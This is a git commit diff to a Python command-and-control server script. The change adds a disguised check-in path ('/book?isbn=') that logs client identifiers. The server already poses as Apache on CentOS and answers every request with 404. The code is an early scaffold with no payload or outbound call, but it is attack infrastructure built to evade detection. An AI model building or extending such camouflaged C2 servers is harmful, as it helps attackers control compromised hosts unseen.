9a7422616b803360b7ab54d2e68838a71ea5041a
byt3scr1b3 <89225495+byt3scr1b3@users.noreply.github.com>
2024-03-04 08:23:11 +0100

    Update c2_server.py

--- c2_server.py
+++ c2_server.py
@@ -4,22 +4,22 @@ PORT = 1337
 
 BIND_ADDR = ""
 
+CMD_REQUEST = "/book?isbn="
+
 class C2Handler(BaseHTTPRequestHandler):
-    """ This is a child class of the BaseHTTPRequestHandler class.  It handles all HTTP requests that arrive at the c2
-    server."""
 
     server_version = "Apache/2.4.58"
     sys_version = "(CentOS)"
 
     def do_GET(self):
-        """ This method handles all HTTP GET requests that arrive at the c2 server. """
+
+        if self.path.startswith(CMD_REQUEST):
+            client = self.path.split(CMD_REQUEST)[1]
+            print(client)
 
         self.send_response(404)
         self.end_headers()
 
-
-print("server_version: ", C2Handler.server_version)
-print("sys_version: ", C2Handler.sys_version)
 
 server = HTTPServer((BIND_ADDR, PORT), C2Handler)
 
